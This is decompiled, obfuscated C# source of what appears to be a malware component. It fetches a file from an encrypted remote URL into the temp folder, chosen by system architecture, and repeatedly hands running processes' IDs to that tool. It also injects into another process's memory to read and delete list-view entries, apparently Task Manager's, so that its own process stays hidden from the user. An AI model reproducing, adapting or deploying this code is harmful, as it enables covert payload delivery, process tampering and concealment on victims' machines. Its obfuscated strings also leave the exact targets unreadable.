using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UvfJgsTEpPeNG;

internal sealed class mxIxVSPRnrz
{
	private struct fGbhbjETnOeyUo
	{
		public uint hjHtbLqQAs;

		public IntPtr JKvtMvBpFJc;

		public IntPtr WMvMooIfEIhD;

		public uint jBcAwEqpfSgDo;

		public uint FfmmnhvGaVkn;

		public IntPtr qKeCPrpWRBWjBG;

		public uint LiNIlTTQKPeDrSkQ;

		public int bUERKhTRGW;

		public IntPtr IRoGjCSXHHQRpO;
	}

	private static volatile bool HEpCENllav;

	public static volatile bool AUceElgEzMVAz;

	[NonSerialized]
	internal static GetString getString_0;

	public static string DAnbewdvpnpk()
	{
		if (IntPtr.Size == 8)
		{
			PHGJAOmKtxaSj.IvUMQWHYEdowYZFOp = UUXDqTEXuBef(new Uri(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368211))));
		}
		else
		{
			PHGJAOmKtxaSj.IvUMQWHYEdowYZFOp = UUXDqTEXuBef(new Uri(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368609))));
		}
		return PHGJAOmKtxaSj.IvUMQWHYEdowYZFOp;
	}

	public static string UUXDqTEXuBef(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(getString_0(107370938), getString_0(107361770)).Remove(0, 3) + getString_0(107370933);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process xRFqRbAlrOQlrad(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void UydxFmogMVpJe(string[] string_0)
	{
		string text = DAnbewdvpnpk();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = xRFqRbAlrOQlrad(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					PHGJAOmKtxaSj.npwWDLTdKyHek(text, text2 + getString_0(107360748) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					PHGJAOmKtxaSj.npwWDLTdKyHek(text, text2 + getString_0(107360748) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + getString_0(107368431));
					PHGJAOmKtxaSj.npwWDLTdKyHek(text, text2 + getString_0(107360748) + PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107368454)));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr pkxCMSFLjfPFw);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr mJbXcGkvIyLABq, IntPtr TqxmMIMkZffjL, byte[] sOFPMnGbDmax, uint DLMjvLeKWGAzuZ, out UIntPtr SnOsetHPkTEMP);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr LZXFGRpYaje, IntPtr UcyKRdAWyOtz, [Out] byte[] EqWOJVJkWJaFF, int xuEUoOXyflbFHuUj, out UIntPtr MzciyyNxetV);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr zsucaOUqlIoHMs, out uint clorqnjaeTIDzE);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] LlcoGkJZAVezdVJd(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr qBgajkAwULmZovN(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void MDjbbKNGXMckgUhUk(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr QoueBeIMEBQR(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void tgpTLgEhiIMYf(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr RKtPDnNbrIhKcyQR()
	{
		IntPtr intPtr = FindWindow(getString_0(107367885), getString_0(107367860));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow(getString_0(107367827), getString_0(107367850));
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107367827), null);
			return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107367801), getString_0(107367812));
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107367827), null);
		return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107367801), getString_0(107367767));
	}

	private static IntPtr oNbfnqNnmRD(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void MaTqLKEoAnuC(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void qAMDnmssrtQnx(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string QQEdJodtsTzDlJ(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		fGbhbjETnOeyUo fGbhbjETnOeyUo = default(fGbhbjETnOeyUo);
		GetWindowThreadProcessId(intptr_0, out var clorqnjaeTIDzE);
		IntPtr intPtr = qBgajkAwULmZovN(clorqnjaeTIDzE);
		IntPtr intPtr2 = QoueBeIMEBQR((uint)Marshal.SizeOf(fGbhbjETnOeyUo), intPtr);
		IntPtr intPtr3 = QoueBeIMEBQR(50u, intPtr);
		fGbhbjETnOeyUo.JKvtMvBpFJc = intptr_1;
		fGbhbjETnOeyUo.WMvMooIfEIhD = (IntPtr)0;
		fGbhbjETnOeyUo.LiNIlTTQKPeDrSkQ = 50u;
		fGbhbjETnOeyUo.qKeCPrpWRBWjBG = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, LlcoGkJZAVezdVJd(fGbhbjETnOeyUo), (uint)Marshal.SizeOf(fGbhbjETnOeyUo), out var SnOsetHPkTEMP);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out SnOsetHPkTEMP);
		tgpTLgEhiIMYf(intPtr, intPtr2, (uint)Marshal.SizeOf(fGbhbjETnOeyUo));
		tgpTLgEhiIMYf(intPtr, intPtr3, 50u);
		MDjbbKNGXMckgUhUk(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void gxpjUFDzeHdd(string string_0)
	{
		IntPtr intPtr = RKtPDnNbrIhKcyQR();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)oNbfnqNnmRD(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = QQEdJodtsTzDlJ(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				MaTqLKEoAnuC(intPtr, (IntPtr)i);
			}
		}
	}

	private static void KiPaBzEADohhx()
	{
		IntPtr intPtr = RKtPDnNbrIhKcyQR();
		if (intPtr != IntPtr.Zero)
		{
			qAMDnmssrtQnx(intPtr);
			qAMDnmssrtQnx(intPtr);
			qAMDnmssrtQnx(intPtr);
			qAMDnmssrtQnx(intPtr);
			qAMDnmssrtQnx(intPtr);
		}
	}

	public static void iEvNqKOoQX()
	{
		Thread thread = new Thread(HmbExNLXEBUcvAeN);
		thread.Start();
	}

	private static void HmbExNLXEBUcvAeN()
	{
		while (!HEpCENllav)
		{
			if (AUceElgEzMVAz)
			{
				gxpjUFDzeHdd(Process.GetCurrentProcess().ProcessName + getString_0(107370933));
				Thread.Sleep(525);
			}
			else
			{
				KiPaBzEADohhx();
				Thread.Sleep(1000);
			}
		}
		HEpCENllav = false;
	}

	static mxIxVSPRnrz()
	{
		Strings.CreateGetStringDelegate(typeof(mxIxVSPRnrz));
		HEpCENllav = false;
		AUceElgEzMVAz = true;
	}
}
